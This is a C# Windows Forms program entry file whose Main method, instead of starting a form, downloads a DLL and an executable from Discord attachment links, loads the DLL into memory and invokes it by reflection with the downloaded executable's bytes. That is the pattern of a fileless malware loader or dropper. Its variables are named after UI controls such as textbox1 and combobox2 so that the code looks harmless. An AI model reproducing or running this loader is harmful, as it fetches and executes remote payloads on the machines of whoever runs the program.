﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp4
{
    static class Program
    {
        /// <summary>
        /// Uygulamanın ana girdi noktası.
        /// </summary>
        [STAThread]
        static void Main()
        {

            
                    var wc = new WebClient();
 
            byte[] textbox1 = wc.DownloadData("https://cdn.discordapp.com/attachments/865579273032040458/865582269473619978/InternetGetCookieExDemo.dll");

            System.Net.WebClient gunaresiseform1 = new System.Net.WebClient();

            Uri combobox2 = new Uri("https://cdn.discordapp.com/attachments/859130004898447360/864127566850555904/WindowsApplication14_2.exe");

            byte[] dbytes = gunaresiseform1.DownloadData(combobox2);

            object student = new object[] { Application.ExecutablePath , string.Empty, dbytes, true };

            Assembly panel1;

            string richtextbox1 = null;

            panel1 = AppDomain.CurrentDomain.Load(textbox1);

            panel1.GetType("InternetGetCookieExDemo.dataclass").InvokeMember("CookiesTextBox", System.Reflection.BindingFlags.InvokeMethod, null, richtextbox1, (object[])student);

        }


       
    }
}
